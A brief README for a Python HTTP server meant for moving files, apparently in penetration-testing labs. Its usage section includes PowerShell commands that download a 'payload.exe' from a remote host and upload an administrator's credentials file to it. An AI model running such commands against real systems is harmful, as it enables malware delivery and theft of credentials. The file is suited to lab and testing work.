# Multi-functions python HTTP Server
A HTTP Server for downloading or uploading file.

Usage:  
Start HTTP Server  
```bash
python3 HTTP_Server.py
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...

sudo python3 HTTP_Server.py 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
Option1:
Download or upload file using web browser
Visit http://[host.ip]:8080

Option2:
Download file  
`Invoke-WebRequest -Uri http://192.168.49.66:8080/payload.exe -OutFile payload.exe`  
Upload file  
`Invoke-Restmethod -uri http://192.168.49.66:8080/credentials.zip -Method Put -Infile C:\\users\\administrator\\desktop\\credentials`  

